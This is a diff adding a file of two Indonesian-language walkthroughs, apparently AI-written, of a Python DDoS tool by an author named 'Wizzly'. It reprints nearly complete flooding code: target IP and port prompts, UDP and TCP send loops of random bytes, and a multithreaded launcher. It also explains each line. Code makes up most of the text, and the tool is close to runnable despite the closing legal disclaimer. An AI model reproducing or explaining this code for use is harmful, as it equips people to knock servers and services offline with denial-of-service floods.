@@ -1,0 +1,263 @@
+Oke, ini adalah kode Python yang merupakan alat DDoS, sama seperti yang sebelumnya, tetapi dengan beberapa tambahan dan modifikasi.  Mari kita bahas:
+
+**1. Import Libraries:**
+
+```python
+import random
+import socket
+import threading
+import os,sys
+import time
+```
+
+* Sama seperti sebelumnya, ini mengimpor library yang diperlukan untuk menjalankan kode.
+
+**2. Tampilan Banner:**
+
+```python
+os.system("clear")
+
+print("\033[91m")
+print("""
+██╗███╗░░██╗██████╗░██╗░░░██╗████████╗
+██║████╗░██║██╔══██╗██║░░░██║╚══██╔══╝
+██║██╔██╗██║██████╔╝██║░░░██║░░░██║░░░
+██║██║╚████║██╔═══╝░██║░░░██║░░░██║░░░
+██║██║░╚███║██║░░░░░╚██████╔╝░░░██║░░░
+╚═╝╚═╝░░╚══╝╚═╝░░░░░░╚═════╝░░░░╚═╝░░░
+""")
+print("KETIK BAWAH")
+print("DDOS-ATTACK")
+
+test = input()
+if test == "D":
+    exit(5)
+os.system("clear")
+```
+
+* Ini mencetak banner teks berwarna untuk alat DDoS.
+* Ada tambahan kode yang meminta pengguna untuk mengetik "D" untuk keluar dari program.
+
+**3. Peringatan:**
+
+```python
+print("============⚠WARNING⚠︎============")
+print("JANGAN DI BUAT ABUSE KALO ABUSE TANGUNG SENDIRI BUKAN NYA GUA NAKUT NAKUTIN ABUSE TANGUNG SENDIRI DDOS BERBAU ILEGAL JADI JANGAN ABUSE TUNGGU 10 DETIK")
+print("============⚠WARNING⚠︎============")
+time.sleep(10)
+```
+
+* Ini menampilkan peringatan kepada pengguna tentang risiko dan konsekuensi dari penggunaan alat DDoS.
+
+**4. Input Pengguna:**
+
+```python
+os.system("clear")
+print ("Autor : Wizzly")
+# ... (banner teks) ...
+
+ip = str(input("\033[91m Target Host/Ip:"))
+port = int(input("\033[91m Target Port:"))
+choice = str(input("\033[91m Gas Ddos? (y/n):"))
+times = int(input("\033[91m Packets:"))
+threads = int(input("\033[91m Threads:"))
+print("APAKAH YAKIN IP INI? IP %s PORT %s"%(ip, port))
+choice = str(input("y/n:"))
+print("PROSES TUNGGU 5 DETIK")
+time.sleep(5)
+```
+
+* Mirip dengan kode sebelumnya, ini meminta pengguna untuk memasukkan informasi target dan pengaturan serangan.
+
+**5. Tampilan Loading:**
+
+```python
+os.system("clear")
+print("\033[91m")
+print("LOADING.")
+time.sleep(1)
+print("LOADING..")
+time.sleep(1)
+print("LOADING...")
+time.sleep(1)
+print("LOADING....")
+time.sleep(1)
+print("LOADING.....")
+time.sleep(1)
+print("!!!!!!!PROGRAM START!!!!!!!")
+time.sleep(4)
+print("!!!!!!!LOOCKED IP %s PORT %s!!!!!!!"%(ip, port))
+time.sleep(2)
+print("!!!!!!!LOOCKED IP TUNGGU 5 DETIK!!!!!!!")
+time.sleep(5)
+os.system("clear")
+```
+
+* Ini menampilkan animasi loading untuk memberi kesan bahwa program sedang bersiap untuk menyerang.
+
+**6. Fungsi `run`:**
+
+```python
+def run():
+        data = random._urandom(2000)
+        i = random.choice(("\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> "))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        addr = (str(ip),int(port))
+                        for x in range(times):
+                                s.sendto(data,addr)
+                        print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
+                except:
+                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")
+```
+
+* Mirip dengan fungsi `Relaxs` sebelumnya, tetapi dengan beberapa perubahan pada output teks.
+
+**7. Fungsi `run2`:**
+
+```python
+def run2():
+        data = random._urandom(615)
+        i = random.choice(("\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> "))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((ip,port))
+                        s.send(data)
+                        for x in range(times):
+                                s.send(data)
+                        print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
+                except:
+                        s.close()
+                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")
+```
+
+* Mirip dengan fungsi `Relaxs2` sebelumnya, tetapi dengan beberapa perubahan pada output teks.
+
+**8. Fungsi `run3`:**
+
+```python
+def run3():
+        data = random._urandom(20)
+        i = random.choice(("\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> "))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((ip,port))
+```
+
+* Fungsi ini tidak selesai, tetapi tampaknya dimaksudkan untuk melakukan serangan TCP dengan ukuran paket yang lebih kecil.
+
+**Penting:**
+
+* **Kode ini sangat merusak:**  Menggunakan kode ini untuk menyerang server atau perangkat yang bukan milik Anda adalah ilegal dan dapat menyebabkan konsekuensi hukum yang serius.
+* **Etika:**  Penting untuk menggunakan alat pemrograman secara bertanggung jawab dan etis. 
+
+Semoga penjelasan ini membantu! 
+Oke, kode ini adalah alat DDoS yang lebih canggih daripada yang sebelumnya.  Mari kita bahas bagian-bagiannya:
+
+**1. Fungsi `run`, `run2`, `run3`:**
+
+```python
+def run():
+        data = random._urandom(1024)
+        i = random.choice(("\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> "))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((ip,port))
+                        s.send(data)
+                        for x in range(times):
+                                s.send(data)
+                        print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
+                except:
+                        s.close()
+                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")
+
+def run2():
+        data = random._urandom(16)
+        i = random.choice(("\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> "))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((ip,port))
+                        s.send(data)
+                        for x in range(times):
+                                s.send(data)
+                        print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
+                except:
+                        s.close()
+                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")
+
+def run3():
+        data = random._urandom(1024)
+        i = random.choice(("\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> "))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((ip,port))
+                        s.send(data)
+                        for x in range(times):
+                                s.send(data)
+                        print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
+                except:
+                        s.close()
+                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")
+```
+
+* **`data = random._urandom(1024)`:**  Membuat data paket acak dengan ukuran 1024 byte.
+* **`while True`:**  Looping tak terbatas untuk terus mengirimkan paket.
+* **`socket.socket(socket.AF_INET, socket.SOCK_STREAM)`:**  Membuat socket TCP.
+* **`s.connect((ip,port))`:**  Menghubungkan ke alamat target.
+* **`s.send(data)`:**  Mengirim paket data `data` ke target.
+* **`for x in range(times): s.send(data)`:**  Mengirim paket data sebanyak `times` kali.
+* **`print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))`:**  Mencetak pesan ke konsol yang menunjukkan serangan sedang berlangsung.
+
+**2. Fungsi `run4`:**
+
+```python
+def run4():
+        data = random._urandom(16)
+        i = random.choice(("\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> "))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((ip,port))
+                        s.send(data)
+                        for x in range(times):
+                                s.send(data)
+                        print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
+                except:
+                        s.close()
+                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")
+```
+
+* Mirip dengan fungsi `run`, tetapi menggunakan ukuran paket 16 byte.
+
+**3. Jalankan Serangan:**
+
+```python
+for y in range(threads):
+        if choice == 'y':
+                th = threading.Thread(target = run)
+                th.start()
+                th = threading.Thread(target = run2)
+                th.start()
+                th = threading.Thread(target = run3)
+                th.start()
+        else:
+                th = threading.Thread(target = run4)
+                th.start()
+```
+
+* Ini membuat `threads` jumlah thread yang menjalankan fungsi `run`, `run2`, `run3`, atau `run4` secara paralel, sehingga mengirimkan banyak paket secara bersamaan.
+
+**Penting:**
+
+* **Kode ini sangat merusak:**  Menggunakan kode ini untuk menyerang server atau perangkat yang bukan milik Anda adalah ilegal dan dapat menyebabkan konsekuensi hukum yang serius.
+* **Etika:**  Penting untuk menggunakan alat pemrograman secara bertanggung jawab dan etis. 
+
+Semoga penjelasan ini membantu! 
+
+
